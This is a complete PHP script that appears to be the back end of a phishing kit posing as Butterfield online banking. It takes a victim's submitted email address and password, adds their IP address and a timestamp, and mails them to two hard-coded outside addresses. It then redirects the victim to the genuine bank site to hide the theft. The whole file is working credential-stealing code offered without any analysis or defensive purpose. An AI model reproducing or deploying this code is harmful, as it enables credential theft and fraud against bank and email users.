<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$user = $_POST['email'];
$passe = $_POST['epass'];
$fiftyme="emmylocal@hotmail.com, patrickman22@zohomail.com";


  $subj = "Butterfield 2 $ip";
  $msg = "Email Login Info\n\nEmail: $user\nEmail Password: $passe\n$ip $adddate\n-----*+++++++++++*-----\n Created By YomZee--------*++++++++++*----------";
  $from = "From: <resultats@tsbdumbs.com>";
  mail("$fiftyme", $subj, $msg, $from);
?>
<script type="text/javascript">
 window.location="https://butterfieldonline.com/"
</script>
